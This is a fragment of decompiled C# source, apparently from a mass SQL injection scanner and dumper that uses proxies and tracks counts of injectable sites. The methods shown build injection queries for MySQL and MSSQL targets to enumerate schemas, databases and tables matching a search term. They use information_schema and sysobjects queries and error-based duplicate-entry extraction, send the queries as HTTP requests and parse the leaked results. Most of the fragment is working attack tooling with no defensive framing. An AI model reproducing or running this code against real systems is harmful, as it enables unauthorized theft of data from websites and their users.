				text = string.Concat(new string[]
				{
					global::Globals.translate_0.GetStr(this, 91, ""),
					" '",
					class49_0.Search,
					"' ",
					global::Globals.translate_0.GetStr(this, 92, ""),
					" ",
					Strings.FormatNumber(num3, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
					", ",
					global::Globals.translate_0.GetStr(this, 93, ""),
					" ",
					Strings.FormatNumber(list.Count, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
					" ",
					global::Globals.translate_0.GetStr(this, 94, ""),
					" "
				});
				try
				{
					foreach (string str in list)
					{
						text = text + "; " + str;
					}
				}
				finally
				{
					List<string>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				if (this.searchColumn_0 == null)
				{
					goto IL_1385;
				}
				object obj2 = this.searchColumn_0;
				lock (obj2)
				{
					this.searchColumn_0.method_1(class49_0.String_0, Class54.smethod_5(class49_0.o.DBType), class49_0.Search, (int)num3, list);
					goto IL_1385;
				}
			}
			if (num4 >= class49_0.Retry)
			{
				global::Globals.DG_SQLi.method_3(global::Globals.translate_0.GetStr(this, 95, ""), 6, class49_0.Item);
			}
			IL_1385:
			return text;
		}
	}

	// Token: 0x06000ED9 RID: 3801 RVA: 0x000606CC File Offset: 0x0005E8CC
	private string method_51(MainForm.Class49 class49_0)
	{
		string text = "";
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		if (this.$STATIC$AnalizerCheckTable$201E1283BC$cDBS$Init == null)
		{
			Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$AnalizerCheckTable$201E1283BC$cDBS$Init, new StaticLocalInitFlag(), null);
		}
		bool flag = false;
		try
		{
			Monitor.Enter(this.$STATIC$AnalizerCheckTable$201E1283BC$cDBS$Init, ref flag);
			if (this.$STATIC$AnalizerCheckTable$201E1283BC$cDBS$Init.State == 0)
			{
				this.$STATIC$AnalizerCheckTable$201E1283BC$cDBS$Init.State = 2;
				this.$STATIC$AnalizerCheckTable$201E1283BC$cDBS = new Dictionary<string, List<string>>();
			}
			else if (this.$STATIC$AnalizerCheckTable$201E1283BC$cDBS$Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			this.$STATIC$AnalizerCheckTable$201E1283BC$cDBS$Init.State = 1;
			if (flag)
			{
				Monitor.Exit(this.$STATIC$AnalizerCheckTable$201E1283BC$cDBS$Init);
			}
		}
		if (this.$STATIC$AnalizerCheckTable$201E1283BC$cDBS.ContainsKey(class49_0.String_0))
		{
			list2 = this.$STATIC$AnalizerCheckTable$201E1283BC$cDBS[class49_0.String_0];
		}
		List<string> list3 = new List<string>();
		string[] array = new string[2];
		string text2 = "";
		List<string> list4 = new List<string>();
		checked
		{
			long num3;
			int num4;
			switch (class49_0.o.DBType)
			{
			case Types.MySQL_No_Error:
			case Types.MySQL_With_Error:
			{
				list3.AddRange(new string[]
				{
					"d.schema_name",
					"t.table_name"
				});
				string text3 = string.Concat(new string[]
				{
					"from information_schema.schemata as d join information_schema.tables as t on t.table_schema = d.schema_name join information_schema.columns as c on c.table_schema = d.schema_name and c.table_name = t.table_name where not c.table_schema in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) ",
					class49_0.CurrentDB ? "and d.schema_name = database() " : " ",
					"and t.table_name like ",
					Class23.smethod_20("%" + class49_0.Search + "%"),
					" # group by t.table_name"
				});
				int num = this.method_52(class49_0, class49_0.String_0, "t.table_name", text3.Replace("group by t.table_name", "").Replace("#", ""));
				text3 += " limit [x],[y]";
				if (num == 0)
				{
					return "";
				}
				if (class49_0.o.DBType == Types.MySQL_No_Error)
				{
					text3 = text3.Replace("#", "");
					for (;;)
					{
						int i;
						if (this.threadPool_0.ThreadCount == 1)
						{
							this.method_1(string.Concat(new string[]
							{
								"[",
								Conversions.ToString(class49_0.Int32_0 + 1),
								"/",
								Conversions.ToString(class49_0.Count),
								"] ",
								global::Globals.translate_0.GetStr(this, 96, ""),
								" '",
								class49_0.Search,
								"' [",
								global::Globals.translate_0.GetStr(this, 89, ""),
								" ",
								Conversions.ToString(i + 1),
								"/",
								Conversions.ToString(num),
								" | ",
								Class23.smethod_11(class49_0.String_0)
							}));
						}
						string url = MySQLNoError.Dump(class49_0.String_0, unchecked(-((class49_0.o.MSSQLCollate > false) ? MySQLCollactions.UnHex : MySQLCollactions.None)) ? MySQLCollactions.UnHex : MySQLCollactions.None, false, false, "", "", list3, i, 1, "", "", "", text3);
						Class54.smethod_1(ref url);
						if (this.method_23())
						{
							break;
						}
						string text4 = class49_0.o.HTTPExt_0.QuickGet(url);
						if (!string.IsNullOrEmpty(text4))
						{
							List<string> list5 = this.DumperForm.method_17(text4, class49_0.o.DBType, false);
							if (list5.Count <= 0)
							{
								break;
							}
							array = Strings.Split(list5[0], Class54.string_2, -1, CompareMethod.Binary);
							if (array.Length <= 1 || list4.Contains(array[1]))
							{
								break;
							}
							string string_ = "from " + array[0] + "." + array[1];
							int num2 = this.method_52(class49_0, class49_0.String_0, "*", string_);
							if (num2 > 0)
							{
								string item = string.Concat(new string[]
								{
									"[",
									Strings.FormatNumber(num2, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
									"] ",
									array[0],
									".",
									array[1]
								});
								list.Add(item);
								list4.Add(array[1]);
								num3 += unchecked((long)num2);
							}
							num4 = 0;
							i++;
							if (!class49_0.AllResults)
							{
								break;
							}
							if (i > num)
							{
								break;
							}
						}
						else
						{
							num4++;
							if (num4 >= class49_0.Retry)
							{
								break;
							}
						}
					}
				}
				else if (class49_0.o.DBType == Types.MySQL_With_Error)
				{
					string text5 = text3;
					List<string> list6 = new List<string>();
					int num5 = num - 1;
					int i = 0;
					while (i <= num5)
					{
						if (list6.Count > 0)
						{
							string text6 = " and not t.table_name in (";
							int num6 = list6.Count - 1;
							for (int j = 0; j <= num6; j++)
							{
								if (j != 0)
								{
									text6 += ",";
								}
								text6 += Class23.smethod_20(list6[j]);
							}
							text6 += ")";
							text3 = text5.Replace("#", text6);
						}
						else
						{
							text3 = text5.Replace("#", "");
						}
						int num7 = 0;
						do
						{
							if (class49_0.CurrentDB & !string.IsNullOrEmpty(text2) & num7 == 0)
							{
								array[0] = text2;
							}
							else
							{
								if (this.threadPool_0.ThreadCount == 1)
								{
									this.method_1(string.Concat(new string[]
									{
										"[",
										Conversions.ToString(class49_0.Int32_0 + 1),
										"/",
										Conversions.ToString(class49_0.Count),
										"] ",
										global::Globals.translate_0.GetStr(this, 96, ""),
										" '",
										class49_0.Search,
										"' [",
										global::Globals.translate_0.GetStr(this, 89, ""),
										" ",
										Conversions.ToString(i + 1),
										"/",
										Conversions.ToString(num),
										"] [",
										Conversions.ToString(num7 + 1),
										"/2] | ",
										Class23.smethod_11(class49_0.String_0)
									}));
								}
								list3.Clear();
								if (num7 != 0)
								{
									if (num7 == 1)
									{
										list3.Add("t.table_name");
									}
								}
								else
								{
									list3.Add("d.schema_name");
								}
								string url = MySQLWithError.Dump(class49_0.String_0, class49_0.o.MySQLCollactions, MySQLErrorType.DuplicateEntry, false, "", "", list3, i, 1, "", "", "", text3);
								Class54.smethod_1(ref url);
								if (this.method_23())
								{
									break;
								}
								string text4 = class49_0.o.HTTPExt_0.QuickGet(url);
								if (!string.IsNullOrEmpty(text4))
								{
									List<string> list7 = Class2.Class3_0.Dumper_0.method_17(text4, class49_0.o.DBType, false);
									if (list7.Count <= 0)
									{
										break;
									}
									array[num7] = list7[0];
									if (num7 == 1)
									{
										if (list4.Contains(array[1]))
										{
											break;
										}
										list4.Add(array[1]);
									}
									if (num7 == 0)
									{
										text2 = list7[0];
									}
									num4 = 0;
								}
								else
								{
									num4++;
									if (num4 >= class49_0.Retry)
									{
										break;
									}
								}
							}
							num7++;
						}
						while (num7 <= 1);
						IL_7AD:
						if (string.IsNullOrEmpty(array[0]) || string.IsNullOrEmpty(array[1]))
						{
							break;
						}
						string string_2 = "from " + array[0] + "." + array[1];
						int num2 = this.method_52(class49_0, class49_0.String_0, "*", string_2);
						if (num2 > 0)
						{
							string item2 = string.Concat(new string[]
							{
								"[",
								Strings.FormatNumber(num2, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
								"] ",
								array[0],
								".",
								array[1]
							});
							list.Add(item2);
							list6.Add(array[1]);
							num3 += unchecked((long)num2);
						}
						array = new string[3];
						if (class49_0.AllResults)
						{
							i++;
							continue;
						}
						break;
						goto IL_7AD;
					}
				}
				break;
			}
			case Types.MSSQL_No_Error:
			case Types.MSSQL_With_Error:
			{
				Types dbtype = class49_0.o.DBType;
				InjectionType oError;
				if (dbtype != Types.MSSQL_No_Error)
				{
					if (dbtype == Types.MSSQL_With_Error)
					{
						oError = InjectionType.Error;
					}
				}
				else
				{
					oError = InjectionType.Union;
				}
				int i;
				if (list2.Count == 0)
				{
					string text4;
					List<string> list8;
					do
					{
						if (this.threadPool_0.ThreadCount == 1)
						{
							this.method_1(string.Concat(new string[]
							{
								"[",
								Conversions.ToString(class49_0.Int32_0 + 1),
								"/",
								Conversions.ToString(class49_0.Count),
								"] ",
								global::Globals.translate_0.GetStr(this, 96, ""),
								" '",
								class49_0.Search,
								class49_0.Search,
								"' ",
								global::Globals.translate_0.GetStr(this, 97, ""),
								" | ",
								Class23.smethod_11(class49_0.String_0)
							}));
						}
						list8 = new List<string>();
						list8.Add("DB_NAME()");
						string url = MSSQL.Info(class49_0.String_0, oError, class49_0.o.MSSQLCollate, list8, "char", "");
						Class54.smethod_1(ref url);
						text4 = class49_0.o.HTTPExt_0.QuickGet(url);
						if (!string.IsNullOrEmpty(text4))
						{
							goto IL_A0F;
						}
						num4++;
					}
					while (num4 < class49_0.Retry);
					break;
					IL_A0F:
					list8 = this.DumperForm.method_17(text4, class49_0.o.DBType, false);
					if (list8.Count != 0)
					{
						list2.Add(list8[0]);
					}
					num4 = 0;
					i = 0;
					if (!class49_0.CurrentDB)
					{
						for (;;)
						{
							if (this.threadPool_0.ThreadCount == 1)
							{
								this.method_1(string.Concat(new string[]
								{
									"[",
									Conversions.ToString(class49_0.Int32_0 + 1),
									"/",
									Conversions.ToString(class49_0.Count),
									"] ",
									global::Globals.translate_0.GetStr(this, 96, ""),
									" '",
									class49_0.Search,
									class49_0.Search,
									"' ",
									global::Globals.translate_0.GetStr(this, 99, ""),
									" ",
									Conversions.ToString(i),
									" | ",
									Class23.smethod_11(class49_0.String_0)
								}));
							}
							list8.Clear();
							list8.Add("DB_NAME(" + Conversions.ToString(i) + ")");
							if (this.method_23())
							{
								break;
							}
							string url = MSSQL.Info(class49_0.String_0, oError, class49_0.o.MSSQLCollate, list8, "char", "");
							Class54.smethod_1(ref url);
							text4 = class49_0.o.HTTPExt_0.QuickGet(url);
							if (!string.IsNullOrEmpty(text4))
							{
								list8 = this.DumperForm.method_17(text4, class49_0.o.DBType, false);
								if (list8.Count == 0)
								{
									goto IL_C2E;
								}
								if (!list2.Contains(list8[0]))
								{
									list2.Add(list8[0]);
								}
								num4 = 0;
								i++;
							}
							else
							{
								num4++;
								if (num4 >= class49_0.Retry)
								{
									break;
								}
							}
						}
						break;
					}
				}
				IL_C2E:
				num4 = 0;
				i = 0;
				if (list2.Contains("master"))
				{
					list2.Remove("master");
				}
				if (list2.Contains("model"))
				{
					list2.Remove("model");
				}
				if (list2.Contains("msdb"))
				{
					list2.Remove("msdb");
				}
				if (list2.Contains("tempdb"))
				{
					list2.Remove("tempdb");
				}
				if (list2.Count != 0)
				{
					if (!this.$STATIC$AnalizerCheckTable$201E1283BC$cDBS.ContainsKey(class49_0.String_0) & !this.method_23())
					{
						this.$STATIC$AnalizerCheckTable$201E1283BC$cDBS.Add(class49_0.String_0, list2);
					}
					while (i <= list2.Count - 1)
					{
						string text7 = list2[i];
						string text3 = "select cast(count(t.name) as char) as x from [" + text7 + "]..[sysobjects] t join [syscolumns] as c on t.id = c.id where t.xtype = char(85) and t.name like " + Class23.smethod_21("%" + class49_0.Search + "%", false, "+", "char");
						if (this.threadPool_0.ThreadCount == 1)
						{
							this.method_1(string.Concat(new string[]
							{
								"[",
								Conversions.ToString(class49_0.Int32_0 + 1),
								"/",
								Conversions.ToString(class49_0.Count),
								"] ",
								global::Globals.translate_0.GetStr(this, 96, ""),
								global::Globals.translate_0.GetStr(this, 99, ""),
								" '",
								class49_0.Search,
								class49_0.Search,
								"' [",
								Conversions.ToString(i + 1),
								"/",
								Conversions.ToString(list2.Count),
								"]  '",
								text7,
								"'  | ",
								Class23.smethod_11(class49_0.String_0)
							}));
						}
						int num = this.method_52(class49_0, class49_0.String_0, "", text3);
						text3 = string.Concat(new string[]
						{
							"select top 1 x from ( select distinct top [x] (t.name) as x from [",
							text7,
							"]..[sysobjects] t join [syscolumns] as c on t.id = c.id where t.xtype = char(85) and t.name like ",
							Class23.smethod_21("%" + class49_0.Search + "%", false, "+", "char"),
							" order by x asc) sq order by x desc"
						});
						if (num != 0)
						{
							int num8 = 0;
							for (;;)
							{
								if (this.threadPool_0.ThreadCount == 1)
								{
									this.method_1(string.Concat(new string[]
									{
										"[",
										Conversions.ToString(class49_0.Int32_0 + 1),
										"/",
										Conversions.ToString(class49_0.Count),
										"] ",
										global::Globals.translate_0.GetStr(this, 96, ""),
										" '",
										class49_0.Search,
										class49_0.Search,
										"' [",
										Conversions.ToString(i + 1),
										"/",
										Conversions.ToString(list2.Count),
										"]  ",
										global::Globals.translate_0.GetStr(this, 100, ""),
										" '",
										text7,
										"' ",
										global::Globals.translate_0.GetStr(this, 101, ""),
										" ",
										Conversions.ToString(num8),
										" | ",
										Class23.smethod_11(class49_0.String_0)
									}));
								}
								string url = MSSQL.Dump(class49_0.String_0, "", "", null, false, oError, "char", class49_0.o.MSSQLCollate, num8, 0, "", "", "", text3, -1);
								Class54.smethod_1(ref url);
								if (this.method_23())
								{
									break;
								}
								string text4 = class49_0.o.HTTPExt_0.QuickGet(url);
								if (!string.IsNullOrEmpty(text4))
								{
									List<string> list8 = this.DumperForm.method_17(text4, class49_0.o.DBType, false);
									if (list8.Count <= 0)
									{
										break;
									}
									array = Strings.Split(list8[0], Class54.string_2, -1, CompareMethod.Binary);
									if (array.Length <= 0 || list4.Contains(array[0]))
									{
										break;
									}
									string string_3 = string.Concat(new string[]
									{
										"select cast(isnull(count(*),char(32)) as char) as x from [",
										text7,
										"]..[",
										array[0],
										"]"
									});
									int num2 = this.method_52(class49_0, class49_0.String_0, "*", string_3);
									if (num2 > 0)
									{
										string item3 = string.Concat(new string[]
										{
											"[",
											Strings.FormatNumber(num2, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
											"] ",
											text7,
											".",
											array[0]
										});
										list.Add(item3);
										list4.Add(array[0]);
										num3 += unchecked((long)num2);
									}
									else if (num2 == -1)
									{
										break;
									}
									num4 = 0;
									if (!class49_0.AllResults)
									{
										break;
									}
									num8++;
									if (num8 > num)
									{
										break;
									}
								}
								else
								{
									num4++;
									if (num4 >= class49_0.Retry)
									{
										break;
									}
								}
							}
							IL_11A8:
							i++;
							continue;
							goto IL_11A8;
						}
						i++;
					}
				}
				break;
			}
			case Types.Oracle_No_Error:
			case Types.Oracle_With_Error:
				return "";
			}
			list.Sort();
			if (list.Count > 0)
			{
				if (this.searchColumn_0 != null)
				{
					object obj = this.searchColumn_0;
					lock (obj)
					{
						this.searchColumn_0.method_1(class49_0.String_0, Class54.smethod_5(class49_0.o.DBType), class49_0.Search, (int)num3, list);
					}
				}
				text = string.Concat(new string[]
				{
					global::Globals.translate_0.GetStr(this, 96, ""),
					" '",
					class49_0.Search,
					"' ",
					global::Globals.translate_0.GetStr(this, 92, ""),
					" ",
					Strings.FormatNumber(num3, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
					", ",
					global::Globals.translate_0.GetStr(this, 93, ""),
					" ",
					Strings.FormatNumber(list.Count, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
					" ",
					global::Globals.translate_0.GetStr(this, 100, ""),
					" "
				});
				try
				{
					foreach (string str in list)
					{
						text = text + "; " + str;
					}
					goto IL_136E;
				}
				finally
				{
					List<string>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
			}
			if (num4 >= class49_0.Retry)
			{
				global::Globals.DG_SQLi.method_3(global::Globals.translate_0.GetStr(this, 95, ""), 6, class49_0.Item);
			}
			IL_136E:
			return text;
		}
	}

	// Token: 0x06000EDA RID: 3802 RVA: 0x00061A80 File Offset: 0x0005FC80
	private int method_52(MainForm.Class49 class49_0, string string_5, string string_6, string string_7)
	{
		int result = -1;
		List<string> list = new List<string>();
		list.Add("count(" + string_6 + ")");
		checked
		{
			List<string> list2;
			int num;
			do
			{
				string url;
				switch (class49_0.o.DBType)
				{
				case Types.MySQL_No_Error:
					url = MySQLNoError.Dump(string_5, class49_0.o.MySQLCollactions, false, false, "", "", list, 0, 1, "", "", "", string_7);
					break;
				case Types.MySQL_With_Error:
					url = MySQLWithError.Dump(string_5, class49_0.o.MySQLCollactions, class49_0.o.MySQLErrorType, false, "", "", list, 0, 1, "", "", "", string_7);
					break;
				default:
					goto IL_1BC;
				case Types.MSSQL_No_Error:
					url = MSSQL.Dump(string_5, "", "", list, false, InjectionType.Union, class49_0.o.MSSQLCast, class49_0.o.MSSQLCollate, 0, 0, "", "", "", string_7, -1);
					break;
				case Types.MSSQL_With_Error:
					url = MSSQL.Dump(string_5, "", "", list, false, InjectionType.Error, class49_0.o.MSSQLCast, class49_0.o.MSSQLCollate, 0, 0, "", "", "", string_7, -1);
					break;
				}
				Class54.smethod_1(ref url);
				string text = class49_0.o.HTTPExt_0.QuickGet(url);
				if (this.method_23())
				{
					goto IL_1C1;
				}
				if (!string.IsNullOrEmpty(text))
				{
					list2 = this.DumperForm.method_17(text, class49_0.o.DBType, false);
					if (list2.Count > 0)
					{
						goto IL_1C6;
					}
				}
				num++;
			}
			while (num < class49_0.Retry);
			goto IL_1E3;
			IL_1BC:
			return 0;
			IL_1C1:
			return 0;
			IL_1C6:
			if (Versioned.IsNumeric(list2[0]))
			{
				result = int.Parse(list2[0]);
			}
			IL_1E3:
			return result;
		}
	}

	// Token: 0x170004E5 RID: 1253
	// (get) Token: 0x06000EDB RID: 3803 RVA: 0x00008191 File Offset: 0x00006391
	// (set) Token: 0x06000EDC RID: 3804 RVA: 0x00061C78 File Offset: 0x0005FE78
	internal virtual TabControlExt mdiTabControl
	{
		[CompilerGenerated]
		get
		{
			return this.tabControlExt_0;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			TabControlExt.TabSelectedFormEventHandler value2 = new TabControlExt.TabSelectedFormEventHandler(this.method_54);
			TabControlExt tabControlExt = this.tabControlExt_0;
			if (tabControlExt != null)
			{
				tabControlExt.TabSelectedForm -= value2;
			}
			this.tabControlExt_0 = value;
			tabControlExt = this.tabControlExt_0;
			if (tabControlExt != null)
			{
				tabControlExt.TabSelectedForm += value2;
			}
		}
	}

	// Token: 0x06000EDD RID: 3805 RVA: 0x00061CBC File Offset: 0x0005FEBC
	private void timer_1_Elapsed(object sender, EventArgs e)
	{
		checked
		{
			if (this.bool_2)
			{
				if (base.InvokeRequired)
				{
					try
					{
						base.Invoke(new EventHandler(this.timer_1_Elapsed), new object[]
						{
							sender,
							e
						});
						goto IL_D48;
					}
					catch (Exception ex)
					{
						goto IL_D48;
					}
				}
				if (!this.lblMainStatus.Text.Equals(this.string_4))
				{
					this.lblMainStatus.Text = this.string_4;
				}
				if (this.$STATIC$HandleTimerBackground$20211C12819D$Tricks$Init == null)
				{
					Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$HandleTimerBackground$20211C12819D$Tricks$Init, new StaticLocalInitFlag(), null);
				}
				bool flag = false;
				try
				{
					Monitor.Enter(this.$STATIC$HandleTimerBackground$20211C12819D$Tricks$Init, ref flag);
					if (this.$STATIC$HandleTimerBackground$20211C12819D$Tricks$Init.State == 0)
					{
						this.$STATIC$HandleTimerBackground$20211C12819D$Tricks$Init.State = 2;
						this.$STATIC$HandleTimerBackground$20211C12819D$Tricks = 1;
					}
					else if (this.$STATIC$HandleTimerBackground$20211C12819D$Tricks$Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					this.$STATIC$HandleTimerBackground$20211C12819D$Tricks$Init.State = 1;
					if (flag)
					{
						Monitor.Exit(this.$STATIC$HandleTimerBackground$20211C12819D$Tricks$Init);
					}
				}
				if (!global::Globals.IS_DUMP_INSTANCE && this.$STATIC$HandleTimerBackground$20211C12819D$Tricks % 2 == 0)
				{
					global::Globals.GQueue.method_4();
				}
				if (this.$STATIC$HandleTimerBackground$20211C12819D$Tricks % 30 == 0)
				{
					this.$STATIC$HandleTimerBackground$20211C12819D$Tricks = 1;
				}
				else
				{
					this.$STATIC$HandleTimerBackground$20211C12819D$Tricks++;
				}
				if (global::Globals.IS_DUMP_INSTANCE)
				{
					string text = this.method_66(global::Globals.G_SOCKS.method_9());
					text = global::Globals.translate_0.GetStr(this, 103, "") + " " + text;
					if (!text.Equals(this.DumperForm.tpProxies.Text))
					{
						this.DumperForm.tpProxies.Text = text;
					}
					text = this.method_66(global::Globals.G_SOCKS.method_10());
					if (!text.Equals(this.lblSocksCount.Text))
					{
						this.lblSocksCount.Text = text;
						return;
					}
					return;
				}
				else
				{
					if (this.bool_3)
					{
						switch (this.mdiTabControl.SelectedIndex())
						{
						case 0:
							this.mdiTabControl.TabPages[this.mdiTabControl.SelectedIndex()].Animate(this.Boolean_1);
							break;
						case 2:
							this.mdiTabControl.TabPages[this.mdiTabControl.SelectedIndex()].Animate(this.DumperForm.Boolean_0);
							break;
						case 4:
							this.mdiTabControl.TabPages[this.mdiTabControl.SelectedIndex()].Animate(this.LoginFinderForm.RunningWorker);
							break;
						}
					}
					if (global::Globals.GStatistics != null && ((this.mdiTabControl != null && this.mdiTabControl.SelectedIndex() == 5 && this.uxTabControl_1.SelectedIndex == 2) | this.twMain.SelectedNode == this.treeNode_14))
					{
						if (this.$STATIC$HandleTimerBackground$20211C12819D$Tricks % 5 == 0)
						{
							global::Globals.GStatistics.method_1(Class26.Enum1.const_5, global::Globals.translate_0.GetStr(this, 104, ""), global::Globals.FormatBytes((double)Process.GetCurrentProcess().WorkingSet64));
							global::Globals.GStatistics.method_1(Class26.Enum1.const_5, global::Globals.translate_0.GetStr(this, 105, ""), global::Globals.FormatBytes((double)Process.GetCurrentProcess().PeakWorkingSet64));
						}
						global::Globals.GStatistics.method_1(Class26.Enum1.const_5, global::Globals.translate_0.GetStr(this, 106, ""), DateAndTime.Now.Subtract(Process.GetCurrentProcess().StartTime).ToString("d\\.hh\\:mm\\:ss"));
						if (this.$STATIC$HandleTimerBackground$20211C12819D$Tricks % 2 == 0)
						{
							long[] array = new long[2];
							unchecked
							{
								if (this.DumperForm.AppDomainControl_0 != null)
								{
									AppDomainControl appDomainControl_ = this.DumperForm.AppDomainControl_0;
									array[0] = (long)appDomainControl_.GetProcessCreated();
									array[1] = (long)appDomainControl_.GetTotalRunning();
								}
							}
							if (this.AppControlDomain != null)
							{
								AppDomainControl appControlDomain = this.AppControlDomain;
								long[] array2 = array;
								int num = 0;
								ref long ptr = ref array2[num];
								array2[num] = ptr + unchecked((long)appControlDomain.GetProcessCreated());
								long[] array3 = array;
								int num2 = 1;
								ptr = ref array3[num2];
								array3[num2] = ptr + unchecked((long)appControlDomain.GetTotalRunning());
							}
							if (array[0] > 0L)
							{
								global::Globals.GStatistics.method_1(Class26.Enum1.const_6, "Process Created", array[0]);
								global::Globals.GStatistics.method_1(Class26.Enum1.const_6, "Running Process", array[1]);
							}
							else
							{
								global::Globals.GStatistics.method_1(Class26.Enum1.const_6, "Process Created", "");
								global::Globals.GStatistics.method_1(Class26.Enum1.const_6, "Running Process", "");
							}
						}
						global::Globals.GStatistics.method_2();
					}
					string text;
					if (this.twMain.SelectedNode != this.treeNode_3)
					{
						if (this.DumperForm.Boolean_0 & this.DumperForm.Int32_0 > 0)
						{
							text = Conversions.ToString(this.DumperForm.Int32_0) + "% " + global::Globals.translate_0.GetStr(this, 108, "");
						}
						else
						{
							text = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 3, "");
						}
					}
					else
					{
						text = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 3, "");
					}
					if (this.bool_3)
					{
						this.mdiTabControl.TabPages[2].Text = text;
						this.mdiTabControl.TabPages[2].Animate(this.DumperForm.Boolean_0);
					}
					else if (!text.Equals(this.treeNode_3.Text))
					{
						this.treeNode_3.Text = text;
					}
					if (this.twMain.SelectedNode != this.treeNode_10)
					{
						if (this.LoginFinderForm.RunningWorker & this.LoginFinderForm.RunningProgress > 0)
						{
							text = Conversions.ToString(this.LoginFinderForm.RunningProgress) + "% " + global::Globals.translate_0.GetStr(this, 108, "");
						}
						else
						{
							text = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 8, "");
						}
					}
					else
					{
						text = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 8, "");
					}
					if (this.bool_3)
					{
						this.mdiTabControl.TabPages[4].Animate(this.LoginFinderForm.RunningWorker);
					}
					else if (!text.Equals(this.treeNode_10.Text))
					{
						this.treeNode_10.Text = text;
					}
					text = this.method_66(global::Globals.GQueue.method_1());
					if (this.bool_3)
					{
						text = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 14, "") + " " + text;
					}
					else
					{
						text = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 0, "") + " " + text;
					}
					if (this.bool_3)
					{
						if (!text.Equals(this.uxTabControl_0.TabPages[0].Text))
						{
							this.uxTabControl_0.TabPages[0].Text = text;
						}
						this.mdiTabControl.TabPages[0].Animate(this.Boolean_1);
					}
					else
					{
						if (!text.Equals(this.treeNode_0.Text))
						{
							this.treeNode_0.Text = text;
						}
						if (global::Globals.GQueue.method_1() > 0)
						{
							global::Globals.GMain.grbScannerURL.Text = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 14, "") + " " + global::Globals.FormatNumbers(global::Globals.GQueue.method_1(), true);
						}
						else
						{
							global::Globals.GMain.grbScannerURL.Text = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 14, "");
						}
					}
					text = this.method_66(global::Globals.DG_SQLi.method_5());
					if (this.enum6_0 == MainForm.Enum6.const_4 & this.int_1 > 0)
					{
						text = global::Globals.translate_0.GetStr(this, 111, "") + " " + text;
						text = Conversions.ToString(this.int_1) + "% " + text;
					}
					else
					{
						text = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 1, "") + " " + text;
					}
					if (this.bool_3)
					{
						if (!text.Equals(this.uxTabControl_0.TabPages[1].Text))
						{
							this.uxTabControl_0.TabPages[1].Text = text;
						}
					}
					else if (!text.Equals(this.treeNode_1.Text))
					{
						this.treeNode_1.Text = text;
					}
					text = global::Globals.FormatNumbers(global::Globals.DG_SQLi.method_6(), true);
					if (!text.Equals(this.lblSQLi.Text))
					{
						this.lblSQLi.Text = text;
					}
					text = this.method_66(global::Globals.DG_SQLiNoInjectable.method_5());
					text = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 2, "") + " " + text;
					if (this.bool_3)
					{
						if (!text.Equals(this.uxTabControl_0.TabPages[3].Text))
						{
							this.uxTabControl_0.TabPages[3].Text = text;
						}
					}
					else if (!text.Equals(this.treeNode_2.Text))
					{
						this.treeNode_2.Text = text;
					}
					text = global::Globals.FormatNumbers(global::Globals.DG_SQLiNoInjectable.method_6(), true);
					if (!text.Equals(this.lblSQLiNoInjectable.Text))
					{
						this.lblSQLiNoInjectable.Text = text;
					}
					text = this.method_66(global::Globals.DG_FileInclusao.method_5());
					text = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 4, "") + " " + text;
					if (this.bool_3)
					{
						if (!text.Equals(this.uxTabControl_0.TabPages[2].Text))
						{
							this.uxTabControl_0.TabPages[2].Text = text;
						}
					}
					else if (!text.Equals(this.treeNode_4.Text))
					{
						this.treeNode_4.Text = text;
					}
					text = global::Globals.FormatNumbers(global::Globals.DG_FileInclusao.method_6(), true);
					if (!text.Equals(this.lblFileInclusao.Text))
					{
						this.lblFileInclusao.Text = text;
					}
					text = this.method_66(global::Globals.GTrash.method_3());
					text = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 5, "") + " " + text;
					if (this.bool_3)
					{
						if (!text.Equals(this.uxTabControl_0.TabPages[4].Text))
						{
							this.uxTabControl_0.TabPages[4].Text = text;
						}
					}
					else if (!text.Equals(this.treeNode_6.Text))
					{
						this.treeNode_6.Text = text;
					}
					text = this.method_66(global::Globals.G_SOCKS.method_9());
					text = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 6, "") + " " + text;
					if (this.bool_3)
					{
						if (!text.Equals(this.mdiTabControl.TabPages[3].Text))
						{
							this.mdiTabControl.TabPages[3].Text = text;
						}
					}
					else if (!text.Equals(this.treeNode_7.Text))
					{
						this.treeNode_7.Text = text;
					}
					text = global::Globals.FormatNumbers(global::Globals.G_SOCKS.method_10(), true);
					if (!text.Equals(this.lblSocksCount.Text))
					{
						this.lblSocksCount.Text = text;
					}
					if (this.twMain.SelectedNode != null)
					{
						if (this.pnlTree.Visible)
						{
							text = global::Globals.APP_VERSION;
						}
						else
						{
							text = global::Globals.APP_VERSION + " [" + this.twMain.SelectedNode.Text.ToUpper() + "]";
						}
						if (!this.Text.Equals(text))
						{
							this.Text = text;
						}
					}
				}
				IL_D48:
				if (this.Boolean_1)
				{
					if (this.$STATIC$HandleTimerBackground$20211C12819D$called_tricks$Init == null)
					{
